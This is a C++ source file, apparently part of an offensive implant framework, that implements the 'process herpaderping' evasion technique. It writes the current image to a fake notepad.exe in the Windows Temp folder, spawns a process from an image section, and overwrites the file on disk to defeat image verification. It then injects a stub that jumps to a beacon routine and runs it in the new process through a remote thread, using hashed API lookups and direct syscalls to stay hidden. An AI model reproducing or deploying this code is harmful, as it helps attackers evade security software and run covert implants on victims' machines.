#include "Herpaderp.h"
#include "ApiHash.h"
#include "NtTypes.h"
#include "Syscalls.h"
#include "core/Beacon.h"

#include <windows.h>

#include <cstring>

namespace herpaderp {

namespace {

void* r(const char* dll, const char* fn) {
    return api::export_by_hash(API_HASH(dll), API_HASH(fn));
}

bool write_file(HANDLE h, const void* data, DWORD n) {
    DWORD w = 0;
    return WriteFile(h, data, n, &w, nullptr) && w == n;
}

bool read_current_image(void*& base, std::size_t& sz) {
    auto peb = reinterpret_cast<void**>(__readgsqword(0x60));
    base = peb ? peb[2] : nullptr;
    if (!base) return false;
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(reinterpret_cast<std::uint8_t*>(base) + dos->e_lfanew);
    sz = nt->OptionalHeader.SizeOfImage;
    return true;
}

} // namespace

bool run() {
    auto cf = reinterpret_cast<HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)>(
        r("kernel32.dll", "CreateFileW"));
    auto sf = reinterpret_cast<DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD)>(
        r("kernel32.dll", "SetFilePointer"));
    auto ch = reinterpret_cast<BOOL(WINAPI*)(HANDLE)>(r("kernel32.dll", "CloseHandle"));
    if (!cf || !sf || !ch) return false;

    const wchar_t* path = L"C:\\Windows\\Temp\\notepad.exe";

    HANDLE hFile = cf(path, GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    void* img = nullptr; std::size_t isz = 0;
    if (!read_current_image(img, isz)) { ch(hFile); return false; }
    write_file(hFile, img, static_cast<DWORD>(isz));

    HANDLE hSection = nullptr;
    LARGE_INTEGER sz{};
    syscalls::ScCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &sz, PAGE_READONLY, SEC_IMAGE, hFile);

    HANDLE hProcess = nullptr;
    nt::ObjectAttributes oa{};
    nt::init_object(oa, nullptr);
    syscalls::ScCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, &oa, (HANDLE)-1,
                                0, hSection, nullptr, nullptr, 0);
    syscalls::ScClose(hSection);

    // Overwrite on-disk bytes before image verification (divergence from section).
    sf(hFile, 0, nullptr, FILE_BEGIN);
    DWORD z = 0;
    write_file(hFile, &z, sizeof(z));

    ch(hFile);

    if (hProcess) {
        std::size_t n = 4096;
        void* remote = nullptr;
        syscalls::ScAllocVm(hProcess, &remote, 0, &n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (remote) {
            unsigned char stub[16] = {
                0x48, 0xB8, 0,0,0,0,0,0,0,0,
                0xFF, 0xE0
            };
            std::uintptr_t ep = reinterpret_cast<std::uintptr_t>(&beacon::run);
            std::memcpy(stub + 2, &ep, 8);
            std::size_t wn = 0;
            syscalls::ScWriteVm(hProcess, remote, stub, sizeof(stub), &wn);
            std::uint32_t old = 0;
            syscalls::ScProtectVm(hProcess, &remote, &n, PAGE_EXECUTE_READ, &old);
            HANDLE hThread = nullptr;
            syscalls::ScCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr, hProcess,
                                       remote, nullptr, FALSE, 0, 0, 0, nullptr);
            if (hThread) syscalls::ScClose(hThread);
        }
        syscalls::ScClose(hProcess);
    }
    ExitProcess(0);
    return true;
}

} // namespace herpaderp
